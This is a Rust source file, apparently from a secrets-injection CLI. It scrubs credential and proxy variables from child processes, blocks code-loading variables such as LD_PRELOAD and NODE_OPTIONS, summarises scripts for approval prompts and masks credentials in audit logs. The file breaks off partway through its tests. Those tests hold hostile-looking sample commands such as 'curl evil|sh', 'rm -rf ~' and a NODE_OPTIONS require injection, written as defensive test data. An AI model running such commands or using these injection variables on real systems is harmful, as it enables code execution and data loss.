//! Shared legacy and bound run environment/prompt semantics.
use std::process::Command;

/// Ambient variables a child must not inherit from the caller: proxy routing that could
/// divert a secret-bearing child's traffic, and other secret managers' credentials.
pub const SCRUBBED_CHILD_ENV: &[&str] = &[
    "NO_PROXY",
    "no_proxy",
    "ALL_PROXY",
    "all_proxy",
    "npm_config_proxy",
    "npm_config_https_proxy",
    "VAULT_TOKEN",
    "OP_SERVICE_ACCOUNT_TOKEN",
    "BWS_ACCESS_TOKEN",
    "DOPPLER_TOKEN",
    "INFISICAL_TOKEN",
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "AWS_SECURITY_TOKEN",
];
/// Any ambient variable with this prefix is also scrubbed (1Password CLI sessions).
const SCRUBBED_CHILD_ENV_PREFIX: &str = "OP_SESSION_";

/// Variables that make a loader, interpreter or shell run code before the program's own
/// `main`. Inherited into an approved, unchanged program they let their setter run code
/// with the injected secrets in reach, so the program pin can't help.
/// Exact names are case-sensitive; `npm_config_node_options` is listed in both spellings
/// because npm reads either.
pub const CODE_LOADING_ENV: &[&str] = &[
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "PYTHONPATH",
    "PYTHONSTARTUP",
    "PYTHONHOME",
    "PYTHONINSPECT",
    "PYTHONUSERBASE",
    "NODE_OPTIONS",
    "NODE_PATH",
    "NODE_REPL_EXTERNAL_MODULE",
    "RUBYOPT",
    "RUBYLIB",
    "PERL5OPT",
    "PERL5LIB",
    "PERLLIB",
    "JAVA_TOOL_OPTIONS",
    "_JAVA_OPTIONS",
    "JDK_JAVA_OPTIONS",
    "BASH_ENV",
    "ENV",
    "ZDOTDIR",
    "PROMPT_COMMAND",
    "npm_config_node_options",
    "NPM_CONFIG_NODE_OPTIONS",
];
/// Any variable with this prefix is also code-loading (dyld: DYLD_INSERT_LIBRARIES, ...).
const CODE_LOADING_ENV_PREFIX: &str = "DYLD_";

pub fn is_code_loading(name: &str) -> bool {
    CODE_LOADING_ENV.contains(&name) || name.starts_with(CODE_LOADING_ENV_PREFIX)
}

/// A schema's plain value may never be a code-loading name, for humans too: the schema
/// is auto-trusted, so a planted line would run in every approved run.
pub fn refuse_code_loading_plain(name: &str) -> anyhow::Result<()> {
    if is_code_loading(name) {
        anyhow::bail!("{name} can't be a plain value: it makes the program load code. Set it in your shell instead");
    }
    Ok(())
}

/// Strip ambient credential and proxy variables from a child's environment before spawn.
/// Names in `injected_names` (explicit `-e` / `.karambit.env` assignments) are left alone,
/// so the injected value wins.
pub fn scrub_child_env<'a>(cmd: &mut Command, injected_names: impl IntoIterator<Item = &'a str>) {
    scrub_child_env_from(cmd, injected_names, std::env::vars_os().map(|(k, _)| k));
}

pub fn scrub_child_env_from<'a>(cmd: &mut Command, injected_names: impl IntoIterator<Item = &'a str>, ambient_names: impl IntoIterator<Item = std::ffi::OsString>) {
    use std::os::unix::ffi::OsStrExt;
    let injected: std::collections::HashSet<&str> = injected_names.into_iter().collect();
    let fixed = SCRUBBED_CHILD_ENV.iter().chain(crate::aws::AwsCreds::env_clear());
    for k in fixed {
        if !injected.contains(k) {
            cmd.env_remove(k);
        }
    }
    for k in ambient_names {
        if k.as_bytes().starts_with(SCRUBBED_CHILD_ENV_PREFIX.as_bytes()) && !k.to_str().is_some_and(|n| injected.contains(n)) {
            cmd.env_remove(&k);
        }
    }
}

/// Names a schema can't set as plain values: the same list `scrub_child_env` removes.
pub fn is_scrubbed(name: &str) -> bool {
    SCRUBBED_CHILD_ENV.contains(&name) || crate::aws::AwsCreds::env_clear().contains(&name) || name.starts_with(SCRUBBED_CHILD_ENV_PREFIX)
}

/// `helper::prompt_param` cuts every prompt parameter at this many characters, so a
/// context that must be seen has to fit in it.
pub const PROMPT_CONTEXT_MAX: usize = 120;

/// Readable context for a run, as shown in prompts: the command, or for a shell
/// script / multi-line command its line count, a short hash and the first real line.
pub fn run_context(command: &[String]) -> String {
    context_of(command, command, PROMPT_CONTEXT_MAX).0
}

/// `run_context` limited to `max` characters. The flag is true only when the text is
/// the whole command, verbatim: one line, nothing collapsed, nothing cut.
pub fn run_context_within(command: &[String], max: usize) -> (String, bool) {
    context_of(command, command, max)
}

/// The context for the audit log: lines come from `shown` (already masked), while the
/// hash covers the real `command`, so it matches the one the prompt displayed.
pub fn audit_context(command: &[String], shown: &[String]) -> String {
    context_of(shown, command, PROMPT_CONTEXT_MAX).0
}

/// The script given to `sh -c`, `bash -lc`, ...: first flag cluster ending in `c`, before
/// any positional argument. `-o`/`-O` take an option name that is skipped. Also returns the
/// arguments after the script (`$0`, `$1`, ...), which the script can run (`eval "$1"`).
fn shell_script(command: &[String]) -> Option<(&String, &[String])> {
    let name = command.first()?.rsplit('/').next()?;
    if !matches!(name, "sh" | "bash" | "zsh") { return None; }
    let mut args = command.iter().enumerate().skip(1);
    while let Some((i, arg)) = args.next() {
        if !arg.starts_with(['-', '+']) { return None; }
        if matches!(arg.as_str(), "-o" | "+o" | "-O" | "+O") { args.next(); continue; }
        if arg.starts_with('-') && !arg.starts_with("--") && arg.len() > 1 && arg.ends_with('c') {
            let script = command.get(i + 1)?;
            return Some((script, &command[i + 2..]));
        }
    }
    None
}

/// Shell positional arguments as shown in a prompt: control characters blanked, empty or
/// spaced ones quoted so they read as one argument each.
fn shown_shell_args(args: &[String]) -> String {
    let shown: Vec<String> = args.iter().map(|a| {
        let a = a.replace(char::is_control, " ");
        if a.is_empty() || a.contains(char::is_whitespace) { format!("'{a}'") } else { a }
    }).collect();
    format!(" -- args: {}", shown.join(" "))
}

fn context_of(command: &[String], hashed: &[String], max: usize) -> (String, bool) {
    let parsed = shell_script(command);
    let script = parsed.map(|(script, _)| script);
    let args = parsed.map_or(&[][..], |(_, args)| args);
    let body = script.cloned().unwrap_or_else(|| command.join(" "));
    let lines: Vec<&str> = body.lines().map(str::trim).filter(|l| !l.is_empty()).collect();
    // Everything outside the script text must be visible verbatim; a control character
    // (newline included) in it would be dropped or reflowed by the prompt.
    let mut unseen = if parsed.is_some() { args } else { command }.iter().any(|a| a.chars().any(char::is_control));
    // A non-shell command is shown trimmed and joined, so edge whitespace would go missing.
    unseen |= parsed.is_none() && body != body.trim();
    let label = match (script, command.first()) {
        (Some(_), Some(sh)) => Some(format!("{} script", sh.rsplit('/').next().unwrap_or(sh))),
        _ if lines.len() > 1 => Some("multi-line command".to_string()),
        _ => None,
    };
    let Some(label) = label else {
        let (text, cut) = fit(lines.first().copied().unwrap_or(""), "", max);
        return (text, !cut && !unseen);
    };
    // The digest covers the script and its arguments, so it still names exactly what runs.
    let real = shell_script(hashed).map_or_else(|| hashed.join(" "), |(script, args)| {
        args.iter().fold(script.clone(), |acc, a| format!("{acc}\0{a}"))
    });
    let digest = crate::sso::sha256_hex(real.as_bytes());
    let mut head = format!("{label}, {} line{}, sha256 {}: ", lines.len(), if lines.len() == 1 { "" } else { "s" }, &digest[..8]);
    // Leading VAR=value lines are shown by name only; they are never skipped silently.
    let mut main = None;
    for (i, line) in lines.iter().enumerate() {
        if line.starts_with('#') { continue; }
        if let Some(name) = simple_assignment(line) {
            head.push_str(&format!("{name}=… "));
            continue;
        }
        main = Some(i);
        break;
    }
    let more = main.map_or(0, |i| lines.len() - i - 1);
    let mut arg_text = if args.is_empty() { String::new() } else { shown_shell_args(args) };
    // Bound the args so they can't push the line count and hash out of the prompt.
    if arg_text.chars().count() > max / 2 {
        arg_text = arg_text.chars().take(max / 2 - 1).chain(['…']).collect();
        unseen = true;
    }
    let tail = if more > 0 { format!("{arg_text}  (+{more} more lines)") } else { arg_text };
    head.push_str(main.map_or("", |i| lines[i]));
    let (text, cut) = fit(&head, &tail, max);
    (text, !cut && !unseen && lines.len() == 1 && main == Some(0))
}

/// `NAME=value` with a plain value: nothing that could run a command or chain one.
fn simple_assignment(line: &str) -> Option<&str> {
    let (name, value) = line.split_once('=')?;
    let mut chars = name.chars();
    let valid = chars.next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_') && chars.all(|c| c.is_ascii_alphanumeric() || c == '_');
    let plain = !value.chars().any(|c| c.is_whitespace() || "$`;|&<>()\\".contains(c));
    (valid && plain).then_some(name)
}

/// Keep `tail` whole (it is the "+N more lines" hint) and cut `text` with `…` to fit `max`.
fn fit(text: &str, tail: &str, max: usize) -> (String, bool) {
    let room = max.saturating_sub(tail.chars().count());
    if text.chars().count() <= room {
        return (format!("{text}{tail}"), false);
    }
    let kept: String = text.chars().take(room.saturating_sub(1)).collect();
    (format!("{kept}…{tail}"), true)
}

/// SHA-256 over each argument followed by a NUL (arguments cannot contain one), so an
/// investigator holding the real command can recompute it:
/// `printf '%s\0' "$@" | shasum -a 256`.
pub fn argv_sha256(argv: &[String]) -> String {
    let mut bytes = Vec::new();
    for arg in argv {
        bytes.extend_from_slice(arg.as_bytes());
        bytes.push(0);
    }
    crate::sso::sha256_hex(&bytes)
}

/// Replace every value of `secrets` found in `argv` with `[REDACTED:name]`. Values the
/// redactor ignores (too short) are skipped, as there. Matches are located on the original
/// text and overlapping ones are merged into one marker (naming every secret involved), so
/// a short secret inside a longer one can't break the longer one's replacement.
pub fn redact_known_values(argv: &[String], secrets: &[(String, &[u8])]) -> Vec<String> {
    let known: Vec<(&str, &str)> = secrets.iter()
        .filter_map(|(name, value)| std::str::from_utf8(value).ok().map(|v| (name.as_str(), v)))
        .filter(|(_, v)| v.len() >= crate::redact::MIN_REDACT_LEN)
        .collect();
    argv.iter().map(|arg| {
        let mut spans: Vec<(usize, usize, &str)> = Vec::new();
        for (name, value) in &known {
            let mut from = 0;
            while let Some(i) = arg[from..].find(value) {
                let start = from + i;
                spans.push((start, start + value.len(), name));
                // Step one character, not one match, so overlapping occurrences are found too.
                from = start + arg[start..].chars().next().map_or(1, char::len_utf8);
            }
        }
        spans.sort_by_key(|&(start, end, _)| (start, std::cmp::Reverse(end)));
        let mut out = String::new();
        let mut done = 0;
        let mut spans = spans.into_iter().peekable();
        while let Some((start, mut end, name)) = spans.next() {
            let mut names = vec![name];
            while let Some(&(_, e, n)) = spans.peek().filter(|(s, ..)| *s < end) {
                end = end.max(e);
                if !names.contains(&n) { names.push(n); }
                spans.next();
            }
            out.push_str(&arg[done..start]);
            out.push_str(&format!("[REDACTED:{}]", names.join(",")));
            done = end;
        }
        out.push_str(&arg[done..]);
        out
    }).collect()
}

const MASK: &str = "[REDACTED]";

/// What the next word of a command line is, given the words before it.
#[derive(Clone, Copy, PartialEq)]
enum Next {
    Plain,
    /// The value of `--password` or similar.
    Secret,
    /// After `Authorization:`: a scheme word (`Bearer`) may come before the credential.
    HeaderValue,
    /// After `-u` / `--user`: `user:pass` -> `user:[REDACTED]`.
    UserPass,
    /// After a bare `-p`: a port or path (kept), unless the next argv element holds spaces,
    /// which no port does and a password may.
    MaybePort,
    /// Inside a quoted secret that continues over several words; holds the quote.
    Quoted(char),
}

/// Best-effort masking of obvious credentials before a command line is written to the
/// audit log: values after `--password`/`--token`-style flags, `-p<value>`,
/// `Authorization:`/`Bearer` headers, `user:pass@` URL userinfo, `-u user:pass`, and
/// `KEY=value` where KEY looks secret. State carries across arguments. An argument that is
/// itself a secret's value is masked whole, spaces included (`--password "a b c"` is one
/// argv element). Only shell scripts (`sh -c SCRIPT`) and other multi-word command lines are
/// scanned word by word, and there a quoted secret is masked up to its closing quote.
pub fn mask_argv(argv: &[String]) -> Vec<String> {
    let script = shell_script(argv).map(|(script, _)| script);
    let mut next = Next::Plain;
    argv.iter().map(|arg| {
        if !script.is_some_and(|s| std::ptr::eq(s, arg)) && let Some(whole) = mask_element(arg, &mut next) { return whole; }
        let masked = mask_words(arg, &mut next);
        // An unclosed quote cannot continue into the next argv element.
        if matches!(next, Next::Quoted(_)) { next = Next::Plain; }
        masked
    }).collect()
}

/// Word-by-word masking of one element that is itself a command line or script.
fn mask_words(arg: &str, next: &mut Next) -> String {
    let mut out = String::new();
    let mut rest = arg;
    let mut open: Option<char> = None;
    while !rest.is_empty() {
        let space = rest.starts_with(char::is_whitespace);
        let end = rest.find(|c: char| c.is_whitespace() != space).unwrap_or(rest.len());
        let (word, tail) = rest.split_at(end);
        rest = tail;
        if space {
            if !matches!(next, Next::Quoted(_)) { out.push_str(word); }
            continue;
        }
        let (after, closed_at) = scan_quotes(word, open);
        open = after;
        if matches!(next, Next::Quoted(_)) {
            // Still inside a masked quoted span: drop words until the quote closes.
            if let Some(i) = closed_at {
                out.push_str(&word[i..]);
                *next = Next::Plain;
            }
            continue;
        }
        let value_state = matches!(next, Next::Secret | Next::HeaderValue | Next::UserPass);
        let masked = mask_word(word, next);
        // A masked value inside a quote that stays open runs on over the following words.
        if masked != word && (value_state || masked != mask_url_userinfo(word)) && *next == Next::Plain && let Some(q) = after {
            *next = Next::Quoted(q);
        }
        out.push_str(&masked);
    }
    out
}

/// Quote open after `word`, given the quote open before it, and the byte index in `word`
/// where the span open before it closes. Backslash escapes outside single quotes.
fn scan_quotes(word: &str, entry: Option<char>) -> (Option<char>, Option<usize>) {
    let mut open = entry;
    let mut closed_at = None;
    let mut chars = word.char_indices();
    while let Some((i, c)) = chars.next() {
        match open {
            Some(q) if c == q => { open = None; if entry.is_some() && closed_at.is_none() { closed_at = Some(i); } }
            Some('\'') => {}
            _ if c == '\\' => { chars.next(); }
            Some(_) => {}
            None if is_quote(c) => open = Some(c),
            None => {}
        }
    }
    (open, closed_at)
}

/// A non-script argv element holding spaces whose value is a secret: the value of a flag
/// given in the previous element, or `--flag=value` / `KEY=value` / `Header: value` /
/// `Bearer value` itself. The value is the whole element or the rest of it, never just its
/// first word. `None` leaves the element to the word scanner.
fn mask_element(arg: &str, next: &mut Next) -> Option<String> {
    if !arg.contains(char::is_whitespace) || arg.starts_with(char::is_whitespace) { return None; }
    let state = std::mem::replace(next, Next::Plain);
    if state != Next::Plain { return Some(mask_value(arg, state)); }
    let (first, rest) = arg.split_once(char::is_whitespace)?;
    let mut state = Next::Plain;
    let masked = mask_word(first, &mut state);
    if state == Next::Plain {
        // `--password=a b`, `KEY=a b`: the value runs to the end of the element.
        return (masked != first && masked != mask_url_userinfo(first)).then_some(masked);
    }
    if rest.trim().is_empty() { *next = state; return Some(arg.to_string()); }
    Some(format!("{first} {}", mask_value(rest.trim_start(), state)))
}

/// Mask `value` (which may hold spaces) as the value `state` expects.
fn mask_value(value: &str, state: Next) -> String {
    match state {
        Next::HeaderValue => match value.split_once(char::is_whitespace) {
            Some((scheme, _)) if ["bearer", "basic", "token", "digest"].iter().any(|s| scheme.eq_ignore_ascii_case(s)) => format!("{scheme} {MASK}"),
            _ => MASK.to_string(),
        },
        Next::UserPass => match value.split_once(':') { Some((user, _)) => format!("{user}:{MASK}"), None => MASK.to_string() },
        _ => MASK.to_string(),
    }
}

fn is_quote(c: char) -> bool { matches!(c, '"' | '\'' | '`') }

/// Swap the unquoted core of `word` for `replacement`, keeping surrounding quotes.
fn requote(word: &str, replacement: &str) -> String {
    let lead = word.len() - word.trim_start_matches(is_quote).len();
    let trail = word.len() - word.trim_end_matches(is_quote).len();
    if lead + trail >= word.len() { return replacement.to_string(); }
    format!("{}{replacement}{}", &word[..lead], &word[word.len() - trail..])
}

fn mask_word(word: &str, next: &mut Next) -> String {
    let core = word.trim_matches(is_quote);
    match std::mem::replace(next, Next::Plain) {
        Next::Quoted(_) => return String::new(),
        Next::Secret | Next::HeaderValue | Next::UserPass if core.contains("[REDACTED") => return word.to_string(),
        Next::Secret => return requote(word, MASK),
        Next::HeaderValue => {
            if ["bearer", "basic", "token", "digest"].iter().any(|s| core.eq_ignore_ascii_case(s)) { *next = Next::Secret; return word.to_string(); }
            return requote(word, MASK);
        }
        Next::UserPass => {
            return match core.split_once(':') { Some((user, _)) => requote(word, &format!("{user}:{MASK}")), None => word.to_string() };
        }
        Next::Plain | Next::MaybePort => {}
    }
    if core.eq_ignore_ascii_case("bearer") { *next = Next::Secret; return word.to_string(); }
    if let Some(flag) = core.strip_prefix('-') {
        let flag = flag.trim_start_matches('-');
        if let Some((name, _)) = flag.split_once('=') {
            if secret_flag(name) { return requote(word, &format!("{}{name}={MASK}", &core[..core.len() - flag.len()])); }
        } else if secret_flag(flag) {
            *next = Next::Secret;
            return word.to_string();
        } else if matches!(flag, "u" | "user" | "proxy-user") {
            *next = Next::UserPass;
            return word.to_string();
        } else if core == "-p" {
            *next = Next::MaybePort;
            return word.to_string();
        } else if core.len() > 2 && core.starts_with("-p") && !core.starts_with("--") {
            // mysql-style `-pSECRET`; a bare `-p` is usually a port or path option.
            return requote(word, &format!("-p{MASK}"));
        }
    }
    if let Some((name, value)) = core.split_once(':').filter(|(n, _)| is_secret_header(n)) {
        if value.trim().is_empty() { *next = Next::HeaderValue; return word.to_string(); }
        return requote(word, &format!("{name}:{MASK}"));
    }
    if let Some((key, value)) = core.split_once('=')
        && !key.is_empty() && key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        && !value.contains("[REDACTED") && looks_sensitive(key, value) {
        return requote(word, &format!("{key}={MASK}"));
    }
    mask_url_userinfo(word)
}

fn is_secret_header(name: &str) -> bool {
    !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
        && (name.to_ascii_lowercase().ends_with("authorization") || secret_flag(name))
}

fn secret_flag(name: &str) -> bool {
    !name.is_empty() && !name.starts_with("no-")
        && (looks_sensitive(&name.replace('-', "_"), "") || name.to_ascii_lowercase().contains("passphrase"))
}

/// `scheme://user:pass@host` -> `scheme://user:[REDACTED]@host`, anywhere in `word`.
fn mask_url_userinfo(word: &str) -> String {
    let mut out = String::new();
    let mut rest = word;
    while let Some(i) = rest.find("://") {
        let (head, tail) = rest.split_at(i + 3);
        out.push_str(head);
        let auth = &tail[..tail.find(['/', '?', '#', '"', '\'']).unwrap_or(tail.len())];
        match auth.rfind('@').and_then(|at| auth[..at].split_once(':').map(|(user, _)| (user, at))) {
            Some((user, at)) => {
                out.push_str(&format!("{user}:{MASK}"));
                rest = &tail[at..];
            }
            None => rest = tail,
        }
    }
    out.push_str(rest);
    out
}

/// Name-based guess at whether a variable is secret. Values are never inspected
/// beyond "does a URL carry a password".
pub fn looks_sensitive(key: &str, value: &str) -> bool {
    let k = key.to_ascii_uppercase();
    let words: Vec<&str> = k.split(|c: char| !c.is_ascii_alphanumeric()).filter(|w| !w.is_empty()).collect();
    let public = ["PUBLIC", "PUBLISHABLE"];
    if words.iter().any(|w| public.contains(w)) || k.starts_with("NEXT_PUBLIC_") || k.starts_with("VITE_") && !k.contains("SECRET") {
        return false;
    }
    let secret_words = ["SECRET", "TOKEN", "PASSWORD", "PASSWD", "PWD", "PASS", "PRIVATE", "CREDENTIAL", "CREDENTIALS",
        "AUTH", "APIKEY", "SIGNATURE", "SALT", "COOKIE", "SESSION", "DSN", "WEBHOOK", "CERT", "PEM"];
    if words.iter().any(|w| secret_words.contains(w)) { return true; }
    if k.contains("API_KEY") || k.ends_with("_KEY") || k == "KEY" || k.contains("ACCESS_KEY") || k.contains("PRIVATE_KEY") {
        return true;
    }
    // postgres://user:pass@host -> secret; http://localhost:3000 -> not.
    if let Some((_, rest)) = value.split_once("://") {
        let auth = rest.split(['/', '?', '#']).next().unwrap_or("");
        if let Some((cred, _)) = auth.rsplit_once('@') { return cred.contains(':'); }
    }
    false
}

/// Ambient `(name, value)` bytes to pass on, and the code-loading names that were dropped.
pub(crate) type BoundAmbient = (Vec<(Vec<u8>, Vec<u8>)>, Vec<String>);

/// Snapshot only the owner's scrubbed ambient environment. Bytes preserve Unix
/// non-UTF8 values; transport is the private instruction channel, not shim envp.
/// For an agent caller (`drop_code_loading`) code-loading variables are also dropped
/// unless the human listed them in `allow_env`; the dropped names (never values) are returned.
pub(crate) fn bound_ambient(drop_code_loading: bool, allow_env: &[String]) -> BoundAmbient {
    bound_ambient_from(std::env::vars_os().collect(), drop_code_loading, allow_env)
}

fn bound_ambient_from(ambient: Vec<(std::ffi::OsString, std::ffi::OsString)>, drop_code_loading: bool, allow_env: &[String]) -> BoundAmbient {
    use std::os::unix::ffi::OsStrExt;
    let mut command = Command::new("unused");
    command.env_clear().envs(ambient.iter().cloned());
    scrub_child_env_from(&mut command, [], ambient.iter().map(|(k, _)| k.clone()));
    let mut dropped = Vec::new();
    let kept = command.get_envs().filter_map(|(k, v)| {
        // Owner/shim control variables are not target configuration.
        if k.as_bytes().starts_with(b"KARAMBIT_") { return None; }
        let name = k.to_string_lossy();
        if drop_code_loading && is_code_loading(&name) && !allow_env.iter().any(|a| *a == *name) {
            dropped.push(name.into_owned());
            return None;
        }
        v.map(|v| (k.as_bytes().to_vec(), v.as_bytes().to_vec()))
    }).collect();
    (kept, dropped)
}

/// Whether `reference` classifies and resolves offline (local envelope present, or backend source configured).
/// Offline (`paths: None`) a reference only has to parse, since nothing is opened.
fn is_reference(paths: Option<&crate::Paths>, config: &crate::Config, reference: &str) -> bool {
    match (crate::classify_reference(config, reference), paths) {
        (Ok(crate::backend::Reference::Legacy(local)), Some(paths)) => crate::store::load_secret(paths, &local).is_ok(),
        (Ok(crate::backend::Reference::Legacy(local)), None) => crate::store::validate_name(&local).is_ok(),
        (Ok(crate::backend::Reference::Backend(parsed)), _) => config.sources.contains_key(&parsed.source),
        (Err(crate::backend::BackendError::NotFound), None) => crate::backend::BackendRef::parse(reference).is_ok(),
        (Err(_), _) => false,
    }
}

/// Offline schema check: local envelope metadata and backend reference syntax only.
/// Tags are annotations, not authorization or proof of an encrypted value's type.
pub fn check(paths: &crate::Paths, config: &crate::Config, text: &str) -> anyhow::Result<serde_json::Value> {
    check_with(Some(paths), config, text)
}

/// `paths: None` is the CI mode (`--offline-refs`): local refs get a name-syntax check
/// and are reported `local_unverified`, because no vault is opened to see if they exist.
pub fn check_with(paths: Option<&crate::Paths>, config: &crate::Config, text: &str) -> anyhow::Result<serde_json::Value> {
    use anyhow::{bail, Context};
    use std::collections::BTreeMap;
    let mut schema = BTreeMap::new();
    for (i, line) in text.lines().enumerate() {
        let Some(declaration) = line.trim().strip_prefix("# schema:") else { continue; };
        let fields: Vec<_> = declaration.split_whitespace().collect();
        if !(2..=3).contains(&fields.len()) || crate::valid_var(fields[0]).is_err()
            || !matches!(fields[1], "required" | "optional")
            || fields.get(2).is_some_and(|t| !matches!(*t, "prod" | "preprod" | "dev")) {
            bail!("line {}: invalid env schema", i + 1);
        }
        if schema.insert(fields[0], (fields[1] == "required", fields.get(2).copied())).is_some() {
            bail!("line {}: duplicate schema declaration", i + 1);
        }
    }
    let assignments = crate::parse_env_file(text).map_err(|_| anyhow::anyhow!("invalid env assignments"))?;
    let mut refs = BTreeMap::new();
    for (name, reference) in assignments {
        if refs.insert(name, reference).is_some() { bail!("duplicate env assignment"); }
    }
    for (name, (required, _)) in &schema {
        if *required && !refs.contains_key(*name) { bail!("schema missing required variable: {name}"); }
    }
    let registry = crate::backend::production_registry();
    let mut rows = Vec::new();
    for (name, reference) in refs {
        // A code-loading name whose value isn't a reference is a plain value, which runs refuse.
        if is_code_loading(&name) && !is_reference(paths, config, &reference) { refuse_code_loading_plain(&name)?; }
        let mut source_unverified = false;
        let classified = match crate::classify_reference(config, &reference) {
            // No vault config offline, so no source is "configured": check the ref's syntax only.
            Err(crate::backend::BackendError::NotFound) if paths.is_none() => {
                source_unverified = true;
                crate::backend::BackendRef::parse(&reference)
            }
            other => other,
        };
        let kind = match classified.map_err(|_| anyhow::anyhow!("invalid reference for {name}"))? {
            crate::backend::Reference::Legacy(local) => {
                match paths {
                    Some(paths) => {
                        crate::store::load_secret(paths, &local).map_err(|_| anyhow::anyhow!("local reference missing or invalid for {name}"))?;
                        "local_envelope"
                    }
                    None => {
                        crate::store::validate_name(&local).map_err(|_| anyhow::anyhow!("invalid local reference for {name}"))?;
                        "local_unverified"
                    }
                }
            }
            crate::backend::Reference::Backend(_) if source_unverified => "backend_source_unverified",
            crate::backend::Reference::Backend(parsed) => {
                let source = config.sources.get(&parsed.source).context("source not configured")?;
                let backend = registry.construct(source).map_err(|_| anyhow::anyhow!("invalid backend configuration for {name}"))?;
                backend.parse_ref(&parsed.native).map_err(|_| anyhow::anyhow!("invalid backend reference for {name}"))?;
                "backend_syntax_only"
            }
        };
        rows.push(serde_json::json!({"variable": name, "kind":kind, "tag":schema.get(name.as_str()).and_then(|(_, t)| *t)}));
    }
    let local_existence = if paths.is_some() { "checked" } else { "unverified (--offline-refs)" };
    Ok(serde_json::json!({"variables": rows, "local_existence": local_existence, "remote_existence_and_type": "unverified", "value_types": "unverified (encrypted values not opened)"}))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::ffi::OsString;

    fn ambient() -> Vec<(OsString, OsString)> {
        ["HOME", "PYTHONPATH", "NODE_OPTIONS", "DYLD_INSERT_LIBRARIES", "RUBYOPT", "KARAMBIT_X", "npm_config_node_options", "VAULT_TOKEN"]
            .iter().map(|k| (OsString::from(*k), OsString::from("v"))).collect()
    }
    fn names(v: &[(Vec<u8>, Vec<u8>)]) -> Vec<String> {
        let mut n: Vec<_> = v.iter().map(|(k, _)| String::from_utf8(k.clone()).unwrap()).collect();
        n.sort();
        n
    }

    #[test]
    fn code_loading_names_are_matched_exactly_or_by_dyld_prefix() {
        for n in ["DYLD_INSERT_LIBRARIES", "DYLD_", "NODE_OPTIONS", "LD_PRELOAD", "_JAVA_OPTIONS", "ZDOTDIR", "npm_config_node_options"] {
            assert!(is_code_loading(n), "{n}");
        }
        for n in ["PATH", "HOME", "NODE_ENV", "XDYLD_FOO", "node_options", "GIT_SSH_COMMAND"] {
            assert!(!is_code_loading(n), "{n}");
        }
    }

    #[test]
    fn bound_ambient_drops_code_loading_names_for_agents_only() {
        let (kept, dropped) = bound_ambient_from(ambient(), true, &[]);
        assert_eq!(names(&kept), ["HOME"]);
        assert_eq!(dropped.len(), 5, "{dropped:?}");
        assert!(dropped.contains(&"PYTHONPATH".to_owned()) && dropped.contains(&"DYLD_INSERT_LIBRARIES".to_owned()));
        assert!(!dropped.contains(&"VAULT_TOKEN".to_owned()), "scrubbed names are not code-loading drops");
        let (kept, dropped) = bound_ambient_from(ambient(), false, &[]);
        assert_eq!(names(&kept), ["DYLD_INSERT_LIBRARIES", "HOME", "NODE_OPTIONS", "PYTHONPATH", "RUBYOPT", "npm_config_node_options"]);
        assert!(dropped.is_empty());
    }

    #[test]
    fn allow_env_lets_listed_names_through_for_agents() {
        let (kept, dropped) = bound_ambient_from(ambient(), true, &["RUBYOPT".into(), "DYLD_INSERT_LIBRARIES".into()]);
        assert_eq!(names(&kept), ["DYLD_INSERT_LIBRARIES", "HOME", "RUBYOPT"]);
        assert!(!dropped.contains(&"RUBYOPT".to_owned()));
    }

    #[test]
    fn check_reports_non_reference_code_loading_assignment() {
        let paths = crate::Paths { root: std::env::temp_dir().join(format!("karambit-envcheck-{}", std::process::id())) };
        let err = check(&paths, &crate::Config::default(), "NODE_OPTIONS=--require ./x.js\n").unwrap_err();
        assert!(format!("{err:#}").contains("NODE_OPTIONS can't be a plain value"), "{err:#}");
    }


    fn argv(parts: &[&str]) -> Vec<String> { parts.iter().map(|s| s.to_string()).collect() }

    #[test]
    fn run_context_shows_line_count_hash_and_collapsed_assignments() {
        let script = "J=https://ci.example\nTOKEN_FILE=/tmp/t\ncurl -s $J/job/x\nrm -rf ~\nwget evil";
        let c = run_context(&argv(&["/bin/sh", "-c", script]));
        let digest = crate::sso::sha256_hex(script.as_bytes());
        assert_eq!(c, format!("sh script, 5 lines, sha256 {}: J=… TOKEN_FILE=… curl -s $J/job/x  (+2 more lines)", &digest[..8]));
        // The leading assignments are never dropped silently, and the value is not shown.
        assert!(!c.contains("ci.example"));
        // Plain commands are unchanged; multi-line plain commands are labelled.
        assert_eq!(run_context(&argv(&["/usr/bin/true", "plain"])), "/usr/bin/true plain");
        assert!(run_context(&argv(&["echo", "a\nb"])).starts_with("multi-line command, 2 lines, sha256 "));
    }

    #[test]
    fn run_context_finds_the_script_after_other_shell_flags() {
        for command in [argv(&["bash", "-lc", "id\nwhoami"]), argv(&["/bin/zsh", "-e", "-c", "id\nwhoami"]), argv(&["sh", "-o", "pipefail", "-c", "id\nwhoami"])] {
            let c = run_context(&command);
            assert!(c.contains("script, 2 lines, sha256 ") && c.ends_with(": id  (+1 more lines)"), "{c}");
        }
    }

    #[test]
    fn assignment_that_runs_something_is_not_collapsed() {
        let c = run_context(&argv(&["sh", "-c", "X=$(curl evil|sh)\nid"]));
        assert!(c.contains("X=$(curl evil|sh)"), "{c}");
        let c = run_context(&argv(&["sh", "-c", "PATH=/tmp/evil:$PATH\nid"]));
        assert!(c.contains("PATH=/tmp/evil:$PATH"), "{c}");
    }

    #[test]
    fn run_context_within_reports_whether_everything_is_shown() {
        assert_eq!(run_context_within(&argv(&["/usr/bin/true", "x"]), 40), ("/usr/bin/true x".into(), true));
        assert!(!run_context_within(&argv(&["sh", "-c", "id\nwhoami"]), 120).1, "multi-line scripts are never complete");
        assert!(run_context_within(&argv(&["sh", "-c", "id"]), 120).1);
        let (text, complete) = run_context_within(&argv(&["sh", "-c", &"x".repeat(300)]), 120);
        assert!(!complete && text.chars().count() <= 120 && text.contains('…'));
        let (text, complete) = run_context_within(&argv(&["/usr/bin/true", &"y".repeat(300)]), 120);
        assert!(!complete && text.chars().count() == 120);
    }

    #[test]
    fn mask_argv_hides_obvious_credentials() {
        let cases: &[(&[&str], &str)] = &[
            (&["tool", "--password", "hunter22", "--ok", "v"], "tool --password [REDACTED] --ok v"),
            (&["tool", "--api-key=abc123xyz"], "tool --api-key=[REDACTED]"),
            (&["tool", "--token", "ghp_abcdef"], "tool --token [REDACTED]"),
            (&["mysql", "-psecretpw", "-p", "3306"], "mysql -p[REDACTED] -p 3306"),
